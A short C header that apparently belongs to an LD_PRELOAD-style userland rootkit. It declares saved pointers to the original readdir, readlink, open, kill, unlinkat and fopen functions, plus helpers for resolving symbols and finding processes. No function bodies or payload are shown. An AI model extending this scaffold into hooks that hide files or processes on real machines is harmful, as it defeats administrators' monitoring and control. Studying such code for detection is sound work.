#ifndef UTIL_H
#define UTIL_H

#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <dirent.h>
#include <string.h>
#include <dlfcn.h>

#include "log.h"

static struct dirent* (*oreaddir)(DIR * );
static ssize_t (*oreadlink)(const char *, char *, size_t);
static int (*oopen)(const char*, int, ...);
static int (*okill)(pid_t, int);
static int (*ounlinkat)(int, const char*, int);
static FILE* (*ofopen)(const char *, const char*);

struct proc {
  int* pid;
  bool alive;
  int pid_count;
};

void *find_addr(char *symbol);
void get_originals();
char * replace(char * string, char x, char y, int len);
struct proc find_proc(const char* name);

#endif
